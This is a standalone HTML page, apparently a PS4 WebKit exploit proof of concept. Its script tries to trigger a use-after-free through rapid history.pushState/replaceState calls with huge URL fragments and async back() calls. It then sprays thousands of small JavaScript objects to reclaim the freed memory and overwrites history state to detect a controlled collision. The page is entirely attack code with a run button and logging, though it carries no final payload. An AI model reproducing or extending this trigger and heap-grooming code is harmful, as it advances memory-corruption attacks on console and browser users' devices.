<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit UAF + Slot Fixation V3 (Correct Trigger)</title>
<style>
body { background:#000; color:#0f0; font-family:monospace; }
button { font-size:16px; margin:10px; }
pre { white-space:pre-wrap; }
</style>
</head>
<body>

<h2>PS4 WebKit – UAF Trigger + Slot Fixation V3</h2>
<button onclick="run()">RUN TEST</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
function log(s){ logEl.textContent += s + "\n"; }
const sleep = ms => new Promise(r=>setTimeout(r,ms));

async function run(){
    logEl.textContent = "";

    log("=== BASELINE ===");
    log("URL.length = " + document.URL.length);
    log("history.state = " + JSON.stringify(history.state));
    log("history.length = " + history.length);

    let size = 977;
    const STEP = 14461;

    log("=== UAF TRIGGER START ===");

    // ===============================
    // PHASE 1 — REAL UAF TRIGGER
    // ===============================
    for(let i=0;i<48;i++){
        let frag = "A".repeat(size);

        history.pushState({i}, "", "#"+frag);
        history.replaceState({i}, "", "#"+frag.slice(0, frag.length >> 1));

        if(i % 6 === 0){
            setTimeout(()=>history.back(),0);
            log("[ITER "+i+"] back() async");
        }

        size += STEP;
        await sleep(5);
    }

    log(">>> UAF WINDOW <<<");
    await sleep(120);

    // ===============================
    // PHASE 2 — SLOT FIXATION V3
    // ===============================
    log("=== SLOT FIXATION PHASE (V3) ===");

    let spray = [];
    for(let i=0;i<8000;i++){
        // objetos pequenos (~32 bytes efetivos)
        spray.push({a:1,b:2});
    }
    log("Sprayed JSObjects: " + spray.length);

    await sleep(20);

    // ===============================
    // PHASE 3 — CONTROL COLLISION
    // ===============================
    log("=== CONTROL COLLISION ===");

    history.replaceState({ctrl:"A"}, "", "#X");
    history.replaceState({ctrl:"B"}, "", "#"+("B".repeat(700000)));

    await sleep(10);
    history.back();

    await sleep(50);

    // ===============================
    // PHASE 4 — POST CHECK
    // ===============================
    log("=== POST ===");
    log("URL.length = " + document.URL.length);
    log("hash.length = " + location.hash.length);
    log("history.state = " + JSON.stringify(history.state));
    log("history.length = " + history.length);

    log("=== CONSISTENCY CHECK ===");
    log("Final ctrl = " + (history.state && history.state.ctrl));

    log("=== TEST END ===");
}
</script>

</body>
</html>
